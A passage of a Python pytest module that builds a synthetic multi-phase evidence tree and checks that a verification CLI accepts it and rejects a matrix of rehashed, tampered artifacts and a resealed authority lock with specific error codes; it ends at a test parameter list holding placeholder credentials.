            record for record in verified_bridge["records"] if record == prepared_material["record"]
        )
        derive_spec = {
            "neutral_snapshot_id": bridge_record["neutral_snapshot_id"],
            "source_snapshot": _source_snapshot(source_root),
            "source_record": source_record,
            "build_descriptor": descriptor,
            "adapter_registry": validated_adapters,
            "input_generator_registry": validated_generators,
            "profiling_results": profiling,
        }
        material = derive_subject_material(derive_spec, bridge_record)
        scale_class = "S" if name.endswith("-s") else "M"
        assert material["source_scale"]["scale_class"] == scale_class
        assert any(
            row["status"] == "COMMON_INPUT_EXECUTABLE"
            for row in material["common_inputs"]["rows"]
        )
        specs.append(
            {
                **{
                    key: value
                    for key, value in derive_spec.items()
                    if key != "source_snapshot"
                },
                "source_root": str(source_root),
                "adapter_registry": authority["adapter_registry"],
                "input_generator_registry": authority["generator_registry"],
            }
        )
        materials.append((name, source_root, descriptor, source_record, profiling, material, bridge_record))

    # Exercise the production frame CLI, while keeping its transient output outside
    # the byte-indexed evidence root.
    specs_path = tmp_path / "subject-specs.json"
    slots_path = tmp_path / "empty-slots.json"
    contracts_path = tmp_path / "empty-contracts.json"
    applicability_path = tmp_path / "empty-applicability.json"
    for path, value in (
        (specs_path, specs),
        (slots_path, []),
        (contracts_path, {}),
        (applicability_path, {}),
    ):
        _write_json(path, value)
    frame_output = tmp_path / "production-frame-output"
    frame_result = _cli(
        "build-frames",
        "--bridge",
        str(verified_bridge_path),
        "--subject-specs",
        str(specs_path),
        "--adapter-root",
        str(ROOT),
        "--generator-root",
        str(ROOT),
        "--slots",
        str(slots_path),
        "--contracts",
        str(contracts_path),
        "--applicability-map",
        str(applicability_path),
        "--output-root",
        str(frame_output),
    )
    assert frame_result.returncode == 0, frame_result.stderr

    jobs = {phase: [] for phase in PHASES}
    subject_indexes = []
    for name, source_root, descriptor, source_record, profiling, material, bridge_record in materials:
        subject_indexes.append(
            _write_subject_index(
                evidence_root,
                name,
                name,
                material,
                bridge_record,
                source_root,
                source_record,
                descriptor,
                profiling,
                validated_adapters,
                validated_generators,
                protocol_sha256,
                jobs,
            )
    )

    materials_by_name = {row[0]: row for row in materials}
    python_material = materials_by_name["python-pep517-s"][5]
    cmake_material = materials_by_name["cmake-ctest-m"][5]
    contract_generator_root = tmp_path / "contract-generators"
    validated_contract_generators = validate_contract_generator_registry(
        _contract_generator_registry(contract_generator_root),
        contract_generator_root,
    )
    python_slot = close_slot(
        {
            "slot_id": canonical_sha256({"slot": "python"}),
            "controlled_subject_id": python_material["subject"]["controlled_subject_id"],
        },
        python_material["subject"]["sites"],
        lambda _site: True,
    )
    contract = {
        "contract_id": canonical_sha256({"contract": "synthetic"}),
        "generator_id": "CONTRACT_NUMERIC_DOMAIN_V1",
        "domain": {"domain": "numeric", "bounds": [0, 1]},
        "site_id": python_slot["site_id"],
    }
    contract_inputs = build_contract_inputs(
        python_slot, contract, validated_contract_generators
    )
    common_id = python_material["common_inputs"]["rows"][0]["input_id"]
    applicable_slot = {
        "slot_id": python_slot["slot_id"],
        "chronology": list(APPLICABLE_SLOT_CHRONOLOGY),
        "contract": contract,
        "e_contract": contract_inputs,
        "patch": {
            "patch_id": canonical_sha256({"patch": "synthetic"}),
            "bytes_sha256": canonical_sha256({"patch-bytes": "synthetic"}),
        },
        "certification_witness": {
            "witness_id": canonical_sha256({"witness": "synthetic"})
        },
        "e_common_input_ids": [common_id],
        "e_contract_input_ids": [row["input_id"] for row in contract_inputs["rows"]],
    }
    cmake_slot = close_slot(
        {
            "slot_id": canonical_sha256({"slot": "cmake"}),
            "controlled_subject_id": cmake_material["subject"]["controlled_subject_id"],
        },
        cmake_material["subject"]["sites"],
        lambda _site: False,
    )
    not_applicable_slot = {
        "slot_id": cmake_slot["slot_id"],
        "chronology": ["APPLICABILITY_CLOSED_NOT_APPLICABLE"],
        "contract": None,
        "e_contract": None,
        "patch": None,
        "certification_witness": None,
        "e_common_input_ids": [],
        "e_contract_input_ids": [],
    }
    slots_by_subject = {
        "python-pep517-s": applicable_slot,
        "cmake-ctest-m": not_applicable_slot,
    }
    for subject_index in subject_indexes:
        slot = slots_by_subject[subject_index["subject_id"]]
        slot_path = evidence_root / f"slots/{slot['slot_id']}.json"
        _write_json(slot_path, slot)
        subject_index["slot_artifacts"].append(
            {
                "slot_id": slot["slot_id"],
                "controlled_subject_id": subject_index["controlled_subject_id"],
                "artifact": _indexed_reference(evidence_root, slot_path),
            }
        )

    candidate = _self_hashed(
        {
            "schema_version": "p3-mr-candidate-frame-v1",
            "artifact_type": "MR_CANDIDATE_FRAME",
            "candidate_mr_ids": ["mr-synthetic-infrastructure"],
        }
    )
    custodian = _self_hashed(
        {
            "schema_version": "p3-mr-custodian-receipt-v1",
            "artifact_type": "MR_CUSTODIAN_RECEIPT",
            "candidate_frame_sha256": candidate["artifact_sha256"],
            "receipt_state": "CLOSED",
            "admitted_mr_ids": ["mr-synthetic-infrastructure"],
            "excluded_mr_ids": [],
        }
    )
    inventory = _self_hashed(
        {
            "schema_version": "p3-mr-final-inventory-v1",
            "artifact_type": "MR_FINAL_INVENTORY",
            "custodian_receipt_sha256": custodian["artifact_sha256"],
            "mr_ids": ["mr-synthetic-infrastructure"],
        }
    )
    portfolios = _self_hashed(
        {
            "schema_version": "p3-mr-portfolios-v1",
            "artifact_type": "MR_PORTFOLIOS",
            "final_inventory_sha256": inventory["artifact_sha256"],
            "portfolios": [
                {
                    "portfolio_id": "synthetic-infrastructure-only",
                    "mr_ids": ["mr-synthetic-infrastructure"],
                }
            ],
        }
    )
    mr_chain = {}
    mr_paths = {}
    for field, artifact in (
        ("candidate_frame", candidate),
        ("custodian_receipt", custodian),
        ("final_inventory", inventory),
        ("portfolios", portfolios),
    ):
        path = evidence_root / f"mr/{field}.json"
        _write_json(path, artifact)
        mr_paths[field] = path
        mr_chain[field] = _indexed_reference(evidence_root, path)
    mr_cli = _cli(
        "verify-mr-inventory",
        "--candidate-frame",
        str(mr_paths["candidate_frame"]),
        "--custodian-receipt",
        str(mr_paths["custodian_receipt"]),
        "--final-inventory",
        str(mr_paths["final_inventory"]),
        "--portfolios",
        str(mr_paths["portfolios"]),
    )
    assert mr_cli.returncode == 0, mr_cli.stderr

    package_entries = []
    package_a_root = evidence_root / "packages/construction-a"
    package_a_root.mkdir(parents=True)
    (package_a_root / "source.py").write_text("value = 1\n", encoding="utf-8")
    specs_a_path = tmp_path / "package-a-specs.json"
    parents_a_path = tmp_path / "package-a-parents.json"
    manifest_a_path = evidence_root / "package-manifests/construction-a.json"
    _write_json(specs_a_path, [{"path": "source.py", "class": "SOURCE"}])
    _write_json(parents_a_path, [])
    package_cli = _cli(
        "build-package",
        "--role",
        "CONSTRUCTION_A",
        "--root",
        str(package_a_root),
        "--specs",
        str(specs_a_path),
        "--parents",
        str(parents_a_path),
        "--output",
        str(manifest_a_path),
    )
    assert package_cli.returncode == 0, package_cli.stderr
    verify_package_cli = _cli(
        "verify-package", "--root", str(package_a_root), "--manifest", str(manifest_a_path)
    )
    assert verify_package_cli.returncode == 0, verify_package_cli.stderr
    manifest_a = read_canonical_json(manifest_a_path)
    package_entries.append(
        {
            "phase": "PHASE_6",
            "input_role": "A",
            "root": package_a_root.relative_to(evidence_root).as_posix(),
            "manifest": _indexed_reference(evidence_root, manifest_a_path),
        }
    )
    for role, dirname, data_class, allowed, input_id in (
        (
            "B_PRIMARY",
            "controlled-primary",
            "E_COMMON_PRIMARY",
            PACKAGE_B_PRIMARY_CLASSES,
            common_id,
        ),
        (
            "B_SENSITIVITY",
            "controlled-sensitivity",
            "E_CONTRACT_SENSITIVITY",
            PACKAGE_B_SENSITIVITY_CLASSES,
            contract_inputs["rows"][0]["input_id"],
        ),
    ):
        package_root_path = evidence_root / f"packages/{dirname}"
        package_root_path.mkdir(parents=True)
        (package_root_path / "runner.py").write_text("print('synthetic')\n", encoding="utf-8")
        input_path = package_root_path / "input.json"
        _write_json(input_path, {"role": data_class, "input_id": input_id})
        manifest = build_package(
            "CONTROLLED_B",
            package_root_path,
            [
                {"path": "runner.py", "class": "EXECUTION_CODE"},
                {"path": "input.json", "class": data_class},
            ],
            [manifest_a["artifact_sha256"]],
            allowed_classes=allowed,
        )
        manifest_path = evidence_root / f"package-manifests/{dirname}.json"
        _write_json(manifest_path, manifest)
        package_entries.append(
            {
                "phase": "PHASE_6",
                "input_role": role,
                "root": package_root_path.relative_to(evidence_root).as_posix(),
                "manifest": _indexed_reference(evidence_root, manifest_path),
            }
        )

    phase_7_intents = sorted(
        (
            intent
            for intent in authority["base_intents"]
            if intent["phase"] == "PHASE_7"
        ),
        key=lambda intent: intent["object_id"],
    )
    paired_ids = [intent["object_id"] for intent in phase_7_intents]
    p12_jobs = [
        {
            **{
                field: intent[field]
                for field in (
                    "job_id",
                    "object_type",
                    "object_id",
                    "mr_id",
                    "evaluation_input_class",
                    "evaluation_input_id",
                    "repetition_id",
                    "environment_id",
                    "job_role",
                )
            },
            "weight": 1,
        }
        for intent in phase_7_intents
    ]
    denominator = freeze_p12_denominator(paired_ids, p12_jobs)
    outcomes = dict(zip(paired_ids, P12_OUTCOME_STATES, strict=True))
    terminal_pairs = []
    result_rows = []
    retry_job_id = min(
        intent["job_id"]
        for intent in authority["base_intents"]
        if intent["phase"] == "PHASE_5"
    )
    for base_intent in authority["base_intents"]:
        phase = base_intent["phase"]
        job_id = base_intent["job_id"]
        jobs[phase].append(job_id)
        attempt_count = 2 if job_id == retry_job_id else 1
        for attempt in range(1, attempt_count + 1):
            intent = {**base_intent, "attempt": attempt}
            failed_retry = job_id == retry_job_id and attempt == 1
            outcome = outcomes[intent["object_id"]] if phase == "PHASE_7" else None
            result_record = {
                "job_id": job_id,
                "attempt": attempt,
                "status": "FAIL_INFRASTRUCTURE" if failed_retry else "PASS",
                "exit_code": 75 if failed_retry else 0,
                "stdout_sha256": canonical_sha256(
                    {"job_id": job_id, "attempt": attempt, "stream": "stdout"}
                ),
                "stderr_sha256": canonical_sha256(
                    {"job_id": job_id, "attempt": attempt, "stream": "stderr"}
                ),
                "duration_seconds": 0.01,
                "failure_code": "SYNTHETIC_RETRY" if failed_retry else "",
                "scientific_outcome": outcome,
                "call_trace_sha256": None,
                "call_trace_identity": None,
            }
            attempt_root = evidence_root / f"jobs/{phase}/{job_id}/{attempt}"
            create_intent(attempt_root, intent)
            write_result(attempt_root, result_record)
            if phase == "PHASE_7":
                terminal_pairs.append({"intent": intent, "result": result_record})
                result_rows.append(
                    {"job_id": job_id, "scientific_outcome": outcome}
                )
    result_rows.sort(key=lambda row: row["job_id"])
    terminal_pairs.sort(key=lambda pair: pair["intent"]["job_id"])
    p12_summary = recompute_p12_summary(denominator, terminal_pairs)
    p12_refs = {}
    p12_paths = {}
    for field, artifact in (
        ("denominator", denominator),
        ("result_rows", result_rows),
        ("summary", p12_summary),
    ):
        path = evidence_root / f"p12/{field}.json"
        _write_json(path, artifact)
        p12_paths[field] = path
        p12_refs[field] = _indexed_reference(evidence_root, path)

    ledger_path = evidence_root / "ledger.jsonl"
    events = reconstruct_attempt_events(evidence_root / "jobs")
    ledger_path.write_bytes(b"".join(canonical_json_bytes(event) for event in events))

    phase_receipts = []
    phase_output_paths = {}
    for phase in PHASES:
        expected_path = evidence_root / f"phase-artifacts/{phase}/expected-jobs.json"
        _write_json(expected_path, sorted(jobs[phase]))
        if phase == "PHASE_0":
            output_body = {
                "schema_version": "p3-synthetic-phase-output-v1",
                "phase": phase,
                "synthetic_only": True,
            }
        elif phase == "PHASE_7":
            output_body = {
                "schema_version": "p3-synthetic-completion-v1",
                "claims_status": "blocked",
                "authorized_real_p12_job_count": 0,
                "recorded_real_scientific_terminal_count": 0,
                "subject_count": 2,
                "ecosystem_count": 2,
                "ecosystems": ["cmake", "python"],
                "scale_classes": ["M", "S"],
                "infrastructure_only": True,
            }
        else:
            output_body = {
                "schema_version": "p3-synthetic-phase-output-v1",
                "phase": phase,
                "infrastructure_only": True,
            }
        output_path = evidence_root / f"phase-artifacts/{phase}/output.json"
        output = _self_hashed(output_body)
        _write_json(output_path, output)
        receipt = close_phase(
            phase,
            protocol_sha256,
            sorted(jobs[phase]),
            ledger_path,
            output["artifact_sha256"],
        )
        receipt_path = evidence_root / f"phase-artifacts/{phase}/receipt.json"
        _write_json(receipt_path, receipt)
        phase_output_paths[phase] = output_path
        phase_receipts.append(
            {
                "phase": phase,
                "receipt": _indexed_reference(evidence_root, receipt_path),
                "expected_jobs": _indexed_reference(evidence_root, expected_path),
                "output_manifest": _indexed_reference(evidence_root, output_path),
            }
        )

    claims = _blocked_claim_ledger(
        authorities["artifacts"]["rq_spec_sha256"].relative_to(
            evidence_root
        ).as_posix(),
        authorities["artifacts"]["claim_ceiling_sha256"].relative_to(
            evidence_root
        ).as_posix(),
        "protocol.json",
    )
    claims_path = evidence_root / "claims.json"
    _write_json(claims_path, claims)

    preflight = authority["lock"]["preflight"]
    event_body = {
        "schema_version": "P3_V3_PREFLIGHT_EVENT_V1",
        **{
            field: preflight[field]
            for field in (
                "normalized_repository_identity",
                "base_commit",
                "base_tree",
                "dependency_lock_sha256",
                "environment_policy_sha256",
            )
        },
        "capability_results": [
            {
                "capability": capability,
                "status": "PASS",
                "observation_sha256": canonical_sha256(
                    {"capability": capability, "synthetic": True}
                ),
            }
            for capability in preflight["required_capabilities"]
        ],
    }
    preflight_event = {
        **event_body,
        "event_sha256": canonical_sha256(event_body),
    }
    preflight_event_path = evidence_root / "preflight-event.json"
    _write_json(preflight_event_path, preflight_event)
    origin_receipt = evidence_module.reconstruct_origin_receipt(
        preflight, preflight_event
    )
    origin_receipt_path = evidence_root / "origin-receipt.json"
    _write_json(origin_receipt_path, origin_receipt)

    for cache in evidence_root.rglob("__pycache__"):
        shutil.rmtree(cache)

    index_body = {
        "schema_version": "P3_V3_EVIDENCE_INDEX_V3",
        "phase_coverage": list(PHASES),
        "controller_source": {
            "root": controller_source.relative_to(evidence_root).as_posix(),
            "manifest": _indexed_reference(
                evidence_root, controller_manifest_path
            ),
        },
        "subject_sources": [
            {
                "subject_id": subject_id,
                "root": materialized_roots[subject_id]
                .relative_to(evidence_root)
                .as_posix(),
                "manifest": _indexed_reference(
                    evidence_root, subject_manifest_paths[subject_id]
                ),
            }
            for subject_id in ("cmake-ctest-m", "python-pep517-s")
        ],
        "protocol": _indexed_reference(evidence_root, protocol_path),
        "protocol_artifacts": {
            field: _indexed_reference(evidence_root, authorities["artifacts"][field])
            for field in authorities["artifacts"]
        },
        "adapter_registries": [
            _indexed_reference(evidence_root, authorities["adapter_registry_path"])
        ],
        "input_generator_registries": [
            _indexed_reference(evidence_root, authorities["generator_registry_path"])
        ],
        "subjects": subject_indexes,
        "packages": package_entries,
        "mr_chain": mr_chain,
        "job_root": "jobs",
        "ledger": _indexed_reference(evidence_root, ledger_path),
        "phase_receipts": phase_receipts,
        "preflight_event": _indexed_reference(
            evidence_root, preflight_event_path
        ),
        "origin_receipt": _indexed_reference(evidence_root, origin_receipt_path),
        "p12": p12_refs,
        "claims": _indexed_reference(evidence_root, claims_path),
    }
    index_path = evidence_root / "evidence-index.json"
    _write_evidence_index(index_path, index_body)
    _assert_required_phase_shape(
        authority["lock"],
        authority["base_intents"],
        index_body["phase_coverage"],
        sorted(path.name for path in (evidence_root / "jobs").iterdir()),
        [entry["phase"] for entry in index_body["phase_receipts"]],
    )
    return {
        "root": evidence_root,
        "index_path": index_path,
        "phase_outputs": phase_output_paths,
        "materials": materials,
        "authority": authority,
        "retry_job_id": retry_job_id,
    }


def _rewrite_index(index_path: Path, index: dict) -> None:
    _refresh_self_hash(index)
    index_path.write_bytes(canonical_json_bytes(index))


def _rewrite_reference(root: Path, index: dict, reference: dict, value) -> None:
    path = root / reference["path"]
    if isinstance(value, dict):
        _refresh_self_hash(value)
    path.write_bytes(canonical_json_bytes(value))
    reference["sha256"] = hashlib.sha256(path.read_bytes()).hexdigest()
    _rewrite_index(root / "evidence-index.json", index)


def _rehash_ledger_events(events: list[dict]) -> list[dict]:
    previous = None
    rebuilt = []
    for sequence, event in enumerate(events, start=1):
        body = {
            **{key: value for key, value in event.items() if key != "event_sha256"},
            "sequence": sequence,
            "previous_event_sha256": previous,
        }
        rebuilt_event = {**body, "event_sha256": canonical_sha256(body)}
        rebuilt.append(rebuilt_event)
        previous = rebuilt_event["event_sha256"]
    return rebuilt


def _refresh_protocol_bound_attempts(root: Path, index: dict) -> None:
    protocol_sha256 = index["protocol"]["sha256"]
    for intent_path in (root / index["job_root"]).rglob("intent.json"):
        intent = read_canonical_json(intent_path)
        intent["protocol_sha256"] = protocol_sha256
        intent_path.write_bytes(canonical_json_bytes(intent))
    events = reconstruct_attempt_events(root / index["job_root"])
    ledger_path = root / index["ledger"]["path"]
    ledger_path.write_bytes(b"".join(canonical_json_bytes(event) for event in events))
    index["ledger"]["sha256"] = hashlib.sha256(ledger_path.read_bytes()).hexdigest()
    for entry in index["phase_receipts"]:
        expected_jobs = read_canonical_json(root / entry["expected_jobs"]["path"])
        output = read_canonical_json(root / entry["output_manifest"]["path"])
        receipt = close_phase(
            entry["phase"],
            protocol_sha256,
            expected_jobs,
            ledger_path,
            output["artifact_sha256"],
        )
        receipt_path = root / entry["receipt"]["path"]
        receipt_path.write_bytes(canonical_json_bytes(receipt))
        entry["receipt"]["sha256"] = hashlib.sha256(
            receipt_path.read_bytes()
        ).hexdigest()


def _refresh_indexed_phase_receipt(root: Path, index: dict, phase: str) -> None:
    entry = next(item for item in index["phase_receipts"] if item["phase"] == phase)
    expected_jobs = read_canonical_json(root / entry["expected_jobs"]["path"])
    output = read_canonical_json(root / entry["output_manifest"]["path"])
    receipt = close_phase(
        phase,
        index["protocol"]["sha256"],
        expected_jobs,
        root / index["ledger"]["path"],
        output["artifact_sha256"],
    )
    receipt_path = root / entry["receipt"]["path"]
    receipt_path.write_bytes(canonical_json_bytes(receipt))
    entry["receipt"]["sha256"] = hashlib.sha256(
        receipt_path.read_bytes()
    ).hexdigest()


def _reseal_ledger_artifact(
    root: Path,
    index: dict,
    *,
    phase: str,
    job_id: str,
    attempt: int,
    event_type: str,
    artifact_sha256: str,
) -> None:
    ledger_path = root / index["ledger"]["path"]
    events = [json.loads(line) for line in ledger_path.read_text().splitlines()]
    event = next(
        item
        for item in events
        if item["phase"] == phase
        and item["job_id"] == job_id
        and item["attempt"] == attempt
        and item["kind"] == event_type
    )
    event["artifact_sha256"] = artifact_sha256
    events = _rehash_ledger_events(events)
    ledger_path.write_bytes(b"".join(canonical_json_bytes(item) for item in events))
    index["ledger"]["sha256"] = hashlib.sha256(ledger_path.read_bytes()).hexdigest()


def _reseal_all_phase_receipts(root: Path, index: dict) -> None:
    for phase in PHASES:
        _refresh_indexed_phase_receipt(root, index, phase)


def _run_complete_verification(
    fixture: dict,
    *,
    index_path: Path | None = None,
    lock_path: Path | None = None,
    literal_lock_sha256: str | None = None,
) -> tuple[subprocess.CompletedProcess, str | None]:
    authority = fixture["authority"]
    evidence_result = _cli(
        "verify-evidence",
        "--index",
        str(index_path or fixture["index_path"]),
        "--authority-lock",
        str(lock_path or authority["lock_path"]),
        "--authority-lock-sha256",
        literal_lock_sha256 or authority["literal_lock_sha256"],
    )
    observed = (
        None
        if evidence_result.returncode == 0
        else json.loads(evidence_result.stderr)["code"]
    )
    return evidence_result, observed


MUTATION_ERRORS = {
    "adapter_byte": "E_AUTHORITY_MANIFEST",
    "adapter_output": "E_INDEXED_SUBJECT_REDERIVATION",
    "source_scale": "E_INDEXED_SUBJECT_REDERIVATION",
    "schema": "E_INDEXED_SUBJECT_REDERIVATION",
    "workload": "E_INDEXED_SUBJECT_REDERIVATION",
    "common_input": "E_INDEXED_SUBJECT_REDERIVATION",
    "fallback_order": "E_INDEXED_SUBJECT_REDERIVATION",
    "technique_label": "E_INDEXED_SUBJECT_REDERIVATION",
    "site": "E_INDEXED_SUBJECT_REDERIVATION",
    "retry_argv": "E_AUTHORITY_INTENT",
    "retry_seed": "E_AUTHORITY_INTENT",
    "event": "E_AUTHORITY_INTENT",
    "ledger": "E_AUTHORITY_INTENT",
    "receipt": "E_PHASE_RECEIPT",
    "package_byte": "E_PACKAGE_SHA256",
    "slot_coordinate": "E_SLOT_COORDINATE",
    "mr_parent": "E_MR_PARENT",
    "denominator": "E_P12_WEIGHT",
    "p12_result": "E_P12_RESULT_ROWS",
    "p12_summary": "E_P12_SUMMARY",
    "claim_status": "E_CLAIM_STATUS",
    "index_membership": "E_INDEX_UNINDEXED",
}


def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
    root = fixture["root"]
    index_path = fixture["index_path"]
    index = read_canonical_json(index_path)
    subject = index["subjects"][0]

    if mutation == "adapter_byte":
        registry_ref = index["adapter_registries"][0]
        registry_path = root / registry_ref["path"]
        registry = read_canonical_json(registry_path)
        adapter = registry["adapters"][0]
        adapter["source_sha256"] = canonical_sha256(
            {"rehashed-adapter-source": adapter["source_sha256"]}
        )
        _refresh_self_hash(registry)
        registry_path.write_bytes(canonical_json_bytes(registry))
        registry_ref["sha256"] = hashlib.sha256(registry_path.read_bytes()).hexdigest()
        protocol_path = root / index["protocol"]["path"]
        protocol = read_canonical_json(protocol_path)
        protocol["adapter_registry_sha256"] = registry_ref["sha256"]
        _refresh_self_hash(protocol)
        protocol_path.write_bytes(canonical_json_bytes(protocol))
        index["protocol"]["sha256"] = hashlib.sha256(protocol_path.read_bytes()).hexdigest()
        for indexed_subject in index["subjects"]:
            indexed_subject["adapter_registry_sha256"] = registry["artifact_sha256"]
        _refresh_protocol_bound_attempts(root, index)
        _rewrite_index(index_path, index)
        return
    if mutation == "adapter_output":
        ref = subject["adapter_discovery"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["public_schemas"][0]["raw_schema"] = {"type": "forged"}
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "source_scale":
        ref = subject["source_scale"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["scale_class"] = "S" if artifact["scale_class"] == "M" else "M"
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "schema":
        ref = subject["public_frame"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["public_schemas"][0]["raw_schema"] = {"type": "forged"}
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation in {"workload", "fallback_order"}:
        ref = subject["profiling_workload"]
        artifact = read_canonical_json(root / ref["path"])
        if mutation == "workload":
            artifact["budget"] += 1
        else:
            artifact["category_order"] = list(reversed(artifact["category_order"]))
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "common_input":
        ref = subject["common_inputs"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["rows"][0]["raw_payload_sha256"] = "0" * 64
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "technique_label":
        ref = subject["technique_profile"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["primary_technique"] = "ARRAY_NUMERICAL"
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "site":
        ref = subject["sites"]
        artifact = read_canonical_json(root / ref["path"])
        artifact[0]["symbol"] = "forged_site"
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation in {"retry_argv", "retry_seed"}:
        intent_path = (
            root
            / f"jobs/PHASE_5/{fixture['retry_job_id']}/2/intent.json"
        )
        intent = read_canonical_json(intent_path)
        if mutation == "retry_argv":
            intent["argv"] = ["forged-retry"]
        else:
            intent["seed"] = 99
        intent_path.write_bytes(canonical_json_bytes(intent))
        return
    if mutation in {"event", "ledger"}:
        ledger_ref = index["ledger"]
        ledger_path = root / ledger_ref["path"]
        events = [json.loads(line) for line in ledger_path.read_text().splitlines()]
        if mutation == "event":
            events[0]["artifact_sha256"] = "0" * 64
            events = _rehash_ledger_events(events)
        else:
            events.pop()
        ledger_path.write_bytes(b"".join(canonical_json_bytes(event) for event in events))
        ledger_ref["sha256"] = hashlib.sha256(ledger_path.read_bytes()).hexdigest()
        _rewrite_index(index_path, index)
        return
    if mutation == "receipt":
        entry = index["phase_receipts"][3]
        ref = entry["receipt"]
        receipt = read_canonical_json(root / ref["path"])
        receipt["terminal_result_count"] += 1
        _rewrite_reference(root, index, ref, receipt)
        return
    if mutation == "package_byte":
        package_file = root / index["packages"][0]["root"] / "source.py"
        package_file.write_text("value = 2\n", encoding="utf-8")
        return
    if mutation == "slot_coordinate":
        subject["slot_artifacts"][0]["controlled_subject_id"] = "0" * 64
        _rewrite_index(index_path, index)
        return
    if mutation == "mr_parent":
        ref = index["mr_chain"]["final_inventory"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["custodian_receipt_sha256"] = "0" * 64
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "denominator":
        ref = index["p12"]["denominator"]
        artifact = read_canonical_json(root / ref["path"])
        artifact["jobs"][0]["weight"] = 2
        artifact["job_inventory_sha256"] = canonical_sha256(artifact["jobs"])
        _rewrite_reference(root, index, ref, artifact)
        return
    if mutation == "p12_result":
        ref = index["p12"]["result_rows"]
        rows = read_canonical_json(root / ref["path"])
        rows[0]["scientific_outcome"] = (
            "MR_VIOLATION"
            if rows[0]["scientific_outcome"] != "MR_VIOLATION"
            else "MR_SATISFIED"
        )
        _rewrite_reference(root, index, ref, rows)
        return
    if mutation == "p12_summary":
        ref = index["p12"]["summary"]
        summary = read_canonical_json(root / ref["path"])
        summary["lower_numerator"] += 1
        _rewrite_reference(root, index, ref, summary)
        return
    if mutation == "claim_status":
        ref = index["claims"]
        claims = read_canonical_json(root / ref["path"])
        claims["claims"][0]["status"] = "supported"
        _refresh_self_hash(claims["claims"][0])
        _rewrite_reference(root, index, ref, claims)
        return
    if mutation == "index_membership":
        index["p12"] = {}
        _rewrite_index(index_path, index)
        return
    raise AssertionError(f"unknown mutation: {mutation}")


def _reseal_indexed_rq_markdown(fixture: dict) -> None:
    root = fixture["root"]
    index = read_canonical_json(fixture["index_path"])
    rq_reference = index["protocol_artifacts"]["rq_spec_sha256"]
    rq_path = root / rq_reference["path"]
    rq_path.write_bytes(rq_path.read_bytes() + b"\n<!-- coordinated RQ reseal -->\n")
    rq_reference["sha256"] = hashlib.sha256(rq_path.read_bytes()).hexdigest()

    protocol_path = root / index["protocol"]["path"]
    protocol = read_canonical_json(protocol_path)
    protocol["rq_spec_sha256"] = rq_reference["sha256"]
    _refresh_self_hash(protocol)
    protocol_path.write_bytes(canonical_json_bytes(protocol))
    index["protocol"]["sha256"] = hashlib.sha256(
        protocol_path.read_bytes()
    ).hexdigest()

    claims_reference = index["claims"]
    claims_path = root / claims_reference["path"]
    claims = read_canonical_json(claims_path)
    claims["rq_authority_sha256"] = rq_reference["sha256"]
    _refresh_self_hash(claims)
    claims_path.write_bytes(canonical_json_bytes(claims))
    claims_reference["sha256"] = hashlib.sha256(claims_path.read_bytes()).hexdigest()
    _refresh_protocol_bound_attempts(root, index)
    _rewrite_index(fixture["index_path"], index)


def test_two_subject_phase0_to_phase7_path_is_production_verified(tmp_path):
    fixture = _build_complete_evidence(tmp_path)

    result, boundary_error = _run_complete_verification(fixture)

    assert boundary_error is None
    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert payload["status"] == "PASS"
    assert payload["authority_lock_sha256"] == fixture["authority"][
        "literal_lock_sha256"
    ]
    assert payload["subject_count"] == 2
    assert payload["authorized_real_p12_job_count"] == 0
    assert payload["recorded_real_scientific_terminal_count"] == 0
    assert payload["claims_status"] == "blocked"
    completion = read_canonical_json(fixture["phase_outputs"]["PHASE_7"])
    assert completion == _self_hashed(
        {
            "schema_version": "p3-synthetic-completion-v1",
            "claims_status": "blocked",
            "authorized_real_p12_job_count": 0,
            "recorded_real_scientific_terminal_count": 0,
            "subject_count": 2,
            "ecosystem_count": 2,
            "ecosystems": ["cmake", "python"],
            "scale_classes": ["M", "S"],
            "infrastructure_only": True,
        }
    )


@pytest.mark.parametrize(("mutation", "expected_code"), MUTATION_ERRORS.items())
def test_rehashed_mutation_matrix_is_rejected_by_independent_reconstruction(
    tmp_path, mutation, expected_code
):
    fixture = _build_complete_evidence(tmp_path)
    _mutate_complete_evidence(fixture, mutation)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == expected_code, (mutation, result.stdout, result.stderr)
    assert result.returncode == 2
    assert not result.stdout
    assert json.loads(result.stderr) == {"code": expected_code, "status": "FAIL"}


@pytest.mark.parametrize("reseal_completion", [False, True])
def test_external_literal_digest_rejects_lock_reseal_before_evidence(
    tmp_path, reseal_completion
):
    fixture = _build_complete_evidence(tmp_path)
    authority = fixture["authority"]
    lock = read_canonical_json(authority["lock_path"])
    lock["task_id"] = "coordinated-lock-reseal"
    authority["lock_path"].write_bytes(canonical_json_bytes(lock))
    if reseal_completion:
        index = read_canonical_json(fixture["index_path"])
        phase_7 = next(
            entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
        )
        output = read_canonical_json(fixture["root"] / phase_7["output_manifest"]["path"])
        output["coordinated_reseal"] = True
        _rewrite_reference(fixture["root"], index, phase_7["output_manifest"], output)
        index = read_canonical_json(fixture["index_path"])
        _refresh_indexed_phase_receipt(fixture["root"], index, "PHASE_7")
        _rewrite_index(fixture["index_path"], index)

    result, observed_code = _run_complete_verification(fixture)

    assert observed_code == "E_AUTHORITY_LOCK_DIGEST", result.stderr
    assert result.returncode == 2
    assert not result.stdout


@pytest.mark.parametrize(
    ("credential_capability", "secret"),
    [
        (
            "Authorization: Bearer TOP_SECRET_PREFLIGHT_TOKEN",
            "TOP_SECRET_PREFLIGHT_TOKEN",
        ),
        (
            "probe https://audit-user:TOP_SECRET_PREFLIGHT_PASSWORD@"
            "example.invalid/capability",
            "TOP_SECRET_PREFLIGHT_PASSWORD",
        ),
    ],
    ids=["bearer", "userinfo"],
)
